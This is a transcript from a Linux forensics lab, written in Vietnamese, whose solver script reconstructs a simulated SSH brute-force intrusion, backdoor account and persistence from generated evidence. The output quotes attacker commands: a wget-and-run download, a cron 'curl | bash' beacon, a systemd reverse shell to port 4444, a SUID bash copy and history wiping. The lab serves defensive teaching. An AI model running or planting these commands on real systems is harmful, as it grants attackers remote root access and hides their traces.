@@ -1,0 +1,97 @@
+### LAB 5.1 - Linux artifact: brute force SSH, backdoor, persistence
+### Transcript that, sinh bang: python3 -I make_artifacts.py evidence && bash solve.sh evidence
+### (chay tren ext4 de giu bit SUID)
+
+$ python3 -I make_artifacts.py evidence
+[+] Da tao cay artifact gia lap tai: /tmp/claude-1000/-mnt-d-REVERSE-IDA-DNSPY-JADX-PYCDC/fc419170-3bc5-46ea-9f29-940ccd065882/scratchpad/run51/evidence
+[+] SUID bit tren evidence/tmp/.cache/sh: CO (fs ho tro)
+[+] Chay tiep:  bash solve.sh evidence
+
+$ bash solve.sh evidence
+
+==== 1. Top IP co nhieu Failed password nhat (nghi brute force) ====
+     16 from 203.0.113.44
+      1 from 198.51.100.9
+      1 from 192.0.2.7
+
+==== 2. Cac login THANH CONG (Accepted) va phien mo that (session opened) ====
+Oct  5 14:23:11 web01 sshd[2301]: Accepted password for deploy from 203.0.113.44 port 52011 ssh2
+Oct  5 14:23:11 web01 sshd[2301]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Oct  5 14:24:02 web01 su[2340]: pam_unix(su:session): session opened for user root by deploy(uid=1001)
+
+==== 3. Leo thang quyen (sudo / su / useradd) ====
+Oct  5 14:24:02 web01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/su
+Oct  5 14:24:02 web01 su[2340]: Successful su for root by deploy
+Oct  5 14:24:02 web01 su[2340]: pam_unix(su:session): session opened for user root by deploy(uid=1001)
+Oct  5 14:25:40 web01 useradd[2401]: new user: name=backup, UID=0, GID=0, home=/root, shell=/bin/bash
+
+==== 4. Lich su lenh cua account bi chiem (deploy) ====
+id
+uname -a
+cat /etc/os-release
+wget http://203.0.113.44/x.sh
+chmod +x x.sh
+./x.sh
+mkdir -p /tmp/.cache
+cp /bin/bash /tmp/.cache/sh
+sudo su
+history -c
+--- root/.bash_history (kiem symlink anti-forensic) ---
+lrwxrwxrwx 1 haipanda Administrator 9 Oct 18 17:26 evidence/root/.bash_history -> /dev/null
+
+==== 5. Persistence qua cron (drop-in trong /etc/cron.d) ====
+# evidence/etc/cron.d/apache-backup
+# drop-in la do ke tan cong tha vao
+*/15 * * * * root curl -fsSL http://203.0.113.44/beacon | bash >/dev/null 2>&1
+
+==== 6. Persistence qua systemd (ExecStart tro toi mang/shell la) ====
+evidence/etc/systemd/system/mysqld-backup.service:6:ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.44/4444 0>&1'
+--- Timer di kem ---
+# evidence/etc/systemd/system/mysqld-backup.timer
+OnUnitActiveSec=10min
+Unit=mysqld-backup.service
+
+==== 7. Account UID 0 (chi nen co root) va account co shell dang nhap ====
+UID 0:
+  root (shell /bin/bash)
+  backup (shell /bin/bash)
+Co login shell:
+  root -> /bin/bash
+  deploy -> /bin/bash
+  backup -> /bin/bash
+
+==== 8. SUID binary va bai tap ket (/tmp, /dev/shm) ====
+SUID binary tim thay:
+  evidence/tmp/.cache/sh
+  [xac nhan] evidence/tmp/.cache/sh co bit SUID
+--- stat (so sanh mtime/ctime cho timeline) ---
+Access: (4755/-rwsr-xr-x)  Uid: ( 1000/haipanda)   Gid: ( 1000/Administrator)
+Access: 2026-10-18 17:26:11.714757142 +0700
+Modify: 2026-10-18 17:26:11.715232676 +0700
+Change: 2026-10-18 17:26:11.715232676 +0700
+--- Noi dung /dev/shm (staging) ---
+total 12
+drwxr-xr-x 2 haipanda Administrator 4096 Oct 18 17:26 .
+drwxr-xr-x 3 haipanda Administrator 4096 Oct 18 17:26 ..
+-rw-r--r-- 1 haipanda Administrator   26 Oct 18 17:26 .scan
+
+==== 9. Timeline dung lai tu cac artifact ====
+  14:21:03  auth.log   Bat dau brute force SSH tu 203.0.113.44 (hang loat Failed/Invalid user)
+  14:23:11  auth.log   Accepted password for deploy tu 203.0.113.44 -> MOC COMPROMISE
+  14:23:11  auth.log   session opened for user deploy (phien that su mo)
+  ~sau do   bash_hist  deploy: wget http://203.0.113.44/x.sh; chmod +x; ./x.sh; cp /bin/bash /tmp/.cache/sh
+  14:24:02  auth.log   deploy sudo /bin/su -> leo len root
+  14:25:40  auth.log   Tao account backdoor "backup" UID=0
+  (persist)  systemd   mysqld-backup.service reverse shell -> 203.0.113.44:4444, timer moi 10 phut
+  (persist)  cron.d    apache-backup: curl http://203.0.113.44/beacon | bash moi 15 phut
+  (privesc)  fs        /tmp/.cache/sh dat bit SUID (chu root)
+  (evasion)  fs        root/.bash_history -> /dev/null (xoa dau go lenh)
+
+==== KET LUAN ====
+  IP tan cong      : 203.0.113.44 (brute force -> vao duoc account deploy)
+  Thoi diem vao    : Oct 5 14:23:11 (Accepted password + session opened)
+  Account backdoor : backup (UID 0 gia danh), tao luc 14:25:40
+  Persistence      : systemd mysqld-backup.service/.timer (reverse shell :4444)
+                     cron.d apache-backup (curl|bash moi 15 phut)
+  Privesc artifact : /tmp/.cache/sh (SUID root)
+  Anti-forensic    : root/.bash_history symlink toi /dev/null, deploy chay history -c
